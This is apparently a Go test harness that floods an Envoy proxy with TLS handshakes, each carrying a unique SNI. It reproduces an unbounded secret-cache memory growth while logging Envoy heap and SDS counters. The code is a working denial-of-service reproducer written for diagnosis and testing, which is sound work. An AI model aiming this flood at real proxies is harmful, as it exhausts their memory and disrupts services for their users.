// Command sniflood drives hostile test 1: TLS handshakes with a fresh SNI each
// time, against the proxy, while sampling Envoy's heap and the SDS server's
// counters. It reproduces the envoyproxy/envoy#47350 pattern (on-demand secret
// cache keyed by client SNI, no eviction).
package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

type sample struct {
	AtHandshakes  int64           `json:"at_handshakes"`
	ElapsedS      float64         `json:"elapsed_s"`
	EnvoyMemory   json.RawMessage `json:"envoy_memory,omitempty"`
	SDSStats      json.RawMessage `json:"sds_stats,omitempty"`
	HandshakeOK   int64           `json:"handshake_ok"`
	HandshakeFail int64           `json:"handshake_fail"`
}

func main() {
	target := flag.String("target", "envoy:443", "proxy address")
	n := flag.Int("n", 20000, "handshakes")
	conc := flag.Int("c", 32, "concurrency")
	domain := flag.String("domain", "flood.anthropic.com", "SNIs are h<i>.<run>.<domain>")
	every := flag.Int("sample-every", 2000, "sample Envoy and SDS every N handshakes")
	envoyAdmin := flag.String("envoy-admin", "http://envoy:9901", "Envoy admin base URL")
	sdsDebug := flag.String("sds-debug", "http://sds:9101", "SDS debug base URL")
	timeout := flag.Duration("timeout", 5*time.Second, "per-handshake timeout")
	flag.Parse()

	run := time.Now().Unix()
	var next, ok, fail atomic.Int64
	var mu sync.Mutex
	var samples []sample
	start := time.Now()
	take := func(at int64) {
		s := sample{AtHandshakes: at, ElapsedS: time.Since(start).Seconds(),
			EnvoyMemory: get(*envoyAdmin + "/memory"), SDSStats: get(*sdsDebug + "/stats"),
			HandshakeOK: ok.Load(), HandshakeFail: fail.Load()}
		mu.Lock()
		samples = append(samples, s)
		mu.Unlock()
		fmt.Fprintf(os.Stderr, "%6d handshakes  ok=%d fail=%d  envoy=%s  sds=%s\n", at, s.HandshakeOK, s.HandshakeFail, s.EnvoyMemory, s.SDSStats)
	}
	take(0)

	var wg sync.WaitGroup
	for w := 0; w < *conc; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				i := next.Add(1)
				if i > int64(*n) {
					return
				}
				sni := fmt.Sprintf("h%d.r%d.%s", i, run, *domain)
				d := &net.Dialer{Timeout: *timeout}
				conn, err := tls.DialWithDialer(d, "tcp", *target, &tls.Config{ServerName: sni, InsecureSkipVerify: true}) //nolint:gosec // flood test, verification is not the point
				if err != nil {
					fail.Add(1)
				} else {
					ok.Add(1)
					conn.Close()
				}
				if i%int64(*every) == 0 {
					take(i)
				}
			}
		}()
	}
	wg.Wait()
	time.Sleep(2 * time.Second) // let Envoy settle before the last sample
	take(int64(*n))
	_ = json.NewEncoder(os.Stdout).Encode(map[string]any{"target": *target, "n": *n, "concurrency": *conc, "domain": *domain, "samples": samples})
}

func get(url string) json.RawMessage {
	c := http.Client{Timeout: 3 * time.Second}
	r, err := c.Get(url)
	if err != nil {
		return json.RawMessage(fmt.Sprintf("%q", err.Error()))
	}
	defer r.Body.Close()
	b, _ := io.ReadAll(r.Body)
	if !json.Valid(b) {
		return json.RawMessage(fmt.Sprintf("%q", string(b)))
	}
	return b
}
